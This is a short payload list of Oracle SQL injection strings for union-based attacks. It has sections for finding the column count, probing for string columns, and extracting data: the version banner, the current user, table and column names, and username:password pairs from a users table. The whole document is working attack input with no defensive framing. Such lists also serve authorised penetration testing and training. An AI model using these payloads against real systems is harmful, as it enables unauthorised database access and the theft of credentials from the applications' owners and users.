# Oracle — Union-Based Payloads
# Oracle requires FROM clause — use FROM DUAL for single rows

# --- Column count ---
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' UNION SELECT NULL FROM DUAL--
' UNION SELECT NULL,NULL FROM DUAL--
' UNION SELECT NULL,NULL,NULL FROM DUAL--

# --- String probe ---
' UNION SELECT 'a' FROM DUAL--
' UNION SELECT 'a',NULL FROM DUAL--

# --- Data extraction ---
' UNION SELECT banner FROM v$version WHERE ROWNUM=1--
' UNION SELECT user FROM dual--
' UNION SELECT global_name FROM global_name--
' UNION SELECT table_name,NULL FROM all_tables WHERE ROWNUM=1--
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS' AND ROWNUM=1--
' UNION SELECT username||':'||password,NULL FROM users WHERE ROWNUM=1--
